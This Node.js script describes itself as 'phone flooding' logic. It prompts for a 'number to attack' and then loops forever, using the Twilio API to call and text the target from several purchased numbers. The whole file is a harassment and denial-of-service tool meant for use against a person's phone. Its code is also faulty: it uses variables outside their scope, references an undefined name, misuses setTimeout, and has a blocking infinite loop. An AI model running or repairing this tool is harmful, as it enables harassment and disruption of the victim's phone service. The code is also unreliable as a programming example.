/* Author: Eric Pinedo
 * Date: August 3, 2017
 * File Description: The main file which will hold all of the 'phone flooding' logic 
 */






/** Basic API logic **/


// storing API keys and phone numbers in privite file config.js
var info = require('./config.js');

//strings and prompts stored in file prompts.js
var prompts = require('./prompts.js');

//text to make sure module.exports is retrieving objects from config.js
console.log( info );

//API keys and token
var accountSid = info.MY_KEY;
var authToken = info.SECREY_KEY;


//create a twilio client object
var client = require('twilio')(accountSid, authToken);



const readline = require('readline');

const read = readline.createInterface({
  input: process.stdin,
  output: process.stdout
});

// prompt user for number to attack
var hello = prompts.enterNumber + prompts.numberStart;
read.question( hello, (answer) => {

  console.log("Number entered: ", answer);

 read.close();
});




// infinite loop phone DoS
while( true ) { 

	// loop through all the phone numbers purchased on Twilio
	for ( number in info.phonebook.fromNumbers){
		
		// wait three seconds before calling 'Call' function		
		setTimeout( Call( number ), 3000);

		// wait three seconds before calling 'Text' function
		setTimeout(Text( number ), 3000);
	}

}


/* function used for calling a number with voice message
 */
function Call( fromNumber ){
	client.calls.create({
    	url: "http://demo.twilio.com/docs/voice.xml",
    	to: answer,
    	from: infor
	}, function(err, call) {
    	process.stdout.write(call.sid);
	});

}
/* function used for sms with body message 
*/

function Text( fromNum ){
	client.messages.create({
    	to: answer,
    	from: fromNum,
    	body: prompts.bodyMessage
	}, function(err, call) {
    	process.stdout.write(call.sid);
	});

}





